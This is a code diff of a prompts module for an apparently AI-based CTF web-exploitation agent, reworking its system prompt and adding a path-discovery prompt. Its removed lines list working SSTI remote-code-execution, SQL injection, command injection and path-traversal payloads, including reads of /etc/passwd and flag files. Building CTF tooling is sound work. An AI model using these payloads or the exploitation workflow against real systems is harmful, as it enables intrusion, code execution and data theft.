@@ -2,72 +2,23 @@
 
 SYSTEM_PROMPT = """You are a CTF web challenge solver. Find the hidden flag by exploiting web vulnerabilities.
 
-## Available Tools
-
-**Reconnaissance:**
-- `get_page_state()` - Overview: title, forms, elements, hints, cookies
-- `list_interactive_elements()` - Detailed element list with selectors
-- `get_page_source()` - Raw HTML source
-- `check_for_flag()` - Search for flag patterns everywhere
-- `try_sensitive_paths()` - Check /robots.txt, /.git, /.env, /admin
-
-**Exploitation:**
-- `fill_input(selector, value)` - Fill input and submit. YOUR MAIN TOOL for exploitation
-- `try_common_payloads(selector, type)` - Detect vuln type. Use ONCE per type, then use fill_input
-- `execute_javascript(code)` - Run JS in page context
-
-**Navigation:**
-- `go_back()` - Go to previous page
+## Tools
+- `try_common_payloads(selector, type)` - Detect vulnerability (ssti/sqli/cmdi/lfi). Use ONCE.
+- `fill_input(selector, value)` - Fill input and submit. Main exploitation tool.
+- `go_back()` - Return to previous page.
+- `check_for_flag()` - Search for flag patterns.
 
 ## Workflow
-1. **Analyze**: Use get_page_state or list_interactive_elements to understand the page
-2. **Identify**: Find input vectors (forms, inputs, URL params)
-3. **Detect**: Use try_common_payloads(selector, "type") to identify vulnerability
-4. **Exploit**: Use fill_input with custom payloads based on detection results
-5. **Adapt**: Read output carefully, adjust payloads, explore directories
+1. Detect vulnerability with try_common_payloads
+2. Exploit with fill_input using appropriate payloads
+3. **ALWAYS list directories before reading files** - use `ls -la /` first
+4. Only read files you have SEEN in directory listings
 
-## Vulnerability Types & Exploitation
-
-**SSTI (Server-Side Template Injection)**
-- Detection: try_common_payloads(sel, "ssti") → looks for {{7*7}}=49
-- Exploit: fill_input(sel, "{{lipsum.__globals__['os'].popen('ls -la /').read()}}")
-- Then: cat files you find, e.g., fill_input(sel, "{{lipsum.__globals__['os'].popen('cat /app/flag').read()}}")
-
-**SQLi (SQL Injection)**
-- Detection: try_common_payloads(sel, "sqli") → auth bypass or errors
-- Exploit login: fill_input(sel, "admin'--") or fill_input(sel, "' OR '1'='1")
-- Extract data: fill_input(sel, "' UNION SELECT 1,2,3--") - adjust column count
-
-**Command Injection**
-- Detection: try_common_payloads(sel, "cmdi") → command output appears
-- Exploit: fill_input(sel, "; ls -la /") then fill_input(sel, "; cat /flag.txt")
-- Variants: | ls, `ls`, $(ls)
-
-**LFI/Path Traversal**
-- Detection: try_common_payloads(sel, "lfi") or "path_traversal"
-- Exploit: fill_input(sel, "../../../etc/passwd") or fill_input(sel, "....//....//etc/passwd")
-- PHP: fill_input(sel, "php://filter/convert.base64-encode/resource=index.php")
-
-**XSS (if flag is in DOM/cookies)**
-- Check page source and cookies for flags
-- Use execute_javascript to access document.cookie or DOM
-
-## Key Rules
-1. **ALWAYS explain your reasoning** before each tool call - describe what you're doing and why
-2. try_common_payloads is for DETECTION only - use once per type, then switch to fill_input
-3. fill_input is your main exploitation tool - craft custom payloads
-4. Read output carefully - empty output may mean file doesn't exist, try different paths
-5. **CRITICAL: ALWAYS explore directories before reading files!**
-   - When you see a directory like `/challenge`, run `ls -la /challenge` FIRST
-   - NEVER guess filenames like `flag.txt` - list the directory to see actual files
-   - Example: see `/challenge` → run `ls -la /challenge` → see `flag` → run `cat /challenge/flag`
-6. Flag formats: flag{}, CTF{}, picoCTF{}, HTB{}, FLAG{}
-
-## Output Interpretation
-- Empty output: Command may have failed or file doesn't exist - try different path
-- Directory listing: Note interesting dirs (challenge/, app/, flag*) and explore them
-- Error messages: Often reveal info about the system - use it to refine payloads
-- HTML entities (&gt; &lt;): Normal, these are < > characters"""
+## Critical Rules
+- **NEVER guess file paths** - only use paths from actual command output
+- Start with `ls -la /` to see root directory, then explore what you find
+- Empty output = file/path doesn't exist, try a different path
+- Flag formats: flag{}, CTF{}, picoCTF{}, HTB{}"""
 
 
 ANALYSIS_PROMPT = """Analyze the page. What vulnerability type? What elements to target? Next action?"""
@@ -77,31 +28,79 @@ PLANNING_PROMPT = """Iteration {iteration}/{max_iterations}. Errors: {error_coun
 What's your next action?"""
 
 
-# Task-specific prompts for queue processing
-QUEUE_DIR_PROMPT = """List the directory: {target}
-Use: fill_input(selector, "{{{{lipsum.__globals__['os'].popen('ls -la {target}').read()}}}}")"""
-
-QUEUE_FILE_PROMPT = """Read the file: {target}
-Use: fill_input(selector, "{{{{lipsum.__globals__['os'].popen('cat {target}').read()}}}}")"""
-
-QUEUE_PROMPTS = {
-    "dir": QUEUE_DIR_PROMPT,
-    "file": QUEUE_FILE_PROMPT,
-}
-
-
-def format_queue_prompt(item_type: str, target: str) -> str | None:
-    """Format a queue-specific prompt for the given item type."""
-    prompt_template = QUEUE_PROMPTS.get(item_type)
-    if prompt_template:
-        return prompt_template.format(target=target)
-    return None
-
-
 REFLECTION_PROMPT = """Your recent approaches aren't working. Try a different vulnerability type or approach."""
 
 
 STUCK_PROMPT = """Stuck after {error_count} errors. Consider: other vuln types, robots.txt, cookies, page source. Use request_human_help if truly stuck."""
+
+
+# Discovery prompt for extracting findings from tool results
+# CRITICAL: Only extract paths that are ACTUALLY visible in the tool result
+DISCOVERY_PROMPT = """Extract paths from the tool result to explore next.
+
+## Context
+{exploitation_context}
+
+## Tool Result
+{tool_result}
+
+## Current Queue
+{current_queue}
+
+## Rules
+1. **ONLY extract paths that are EXPLICITLY shown in the tool result above**
+2. **NEVER guess or invent paths** - if you don't see it in the output, don't add it
+3. If the result is empty or shows an error, return empty array []
+4. If no vulnerability confirmed yet, return empty array []
+
+## What to Look For
+- Directory listings (ls output): extract directory and file names you SEE
+- Error messages: may reveal actual paths
+- If you see a directory, queue it for listing (ls -la)
+- If you see a file that might contain a flag, queue it for reading (cat)
+
+## Response Format
+Return ONLY a JSON array (empty if nothing found):
+```json
+[
+  {{"target": "/actual/path/from/output", "instruction": "fill_input(selector, payload)", "priority": 1}}
+]
+```
+
+Priority: 1=flag-related, 2=interesting, 3=general
+
+**IMPORTANT: Empty array [] if the tool result doesn't show any new paths to explore.**"""
+
+
+def format_discovery_prompt(
+    tool_result: str,
+    current_queue: list,
+    exploitation_context: dict | None = None,
+) -> str:
+    """Format the discovery prompt with tool result, queue, and exploitation context."""
+    queue_str = "Empty" if not current_queue else "\n".join(
+        f"- [P{item.get('priority', 2)}] {item.get('target')}: {item.get('instruction', 'no instruction')[:80]}..."
+        for item in current_queue
+    )
+
+    # Build exploitation context string
+    if exploitation_context:
+        ctx_lines = []
+        if exploitation_context.get("vuln_type"):
+            ctx_lines.append(f"Vulnerability: {exploitation_context['vuln_type']}")
+        if exploitation_context.get("selector"):
+            ctx_lines.append(f"Input Selector: {exploitation_context['selector']}")
+        if exploitation_context.get("url"):
+            ctx_lines.append(f"URL: {exploitation_context['url']}")
+        context_str = "\n".join(ctx_lines) if ctx_lines else "Not yet determined"
+    else:
+        context_str = "Not yet determined - analyze the tool result to infer"
+
+    return DISCOVERY_PROMPT.format(
+        tool_result=tool_result[:2000],  # Limit to avoid token overflow
+        current_queue=queue_str,
+        exploitation_context=context_str,
+    )
 
 
 def format_planning_prompt(
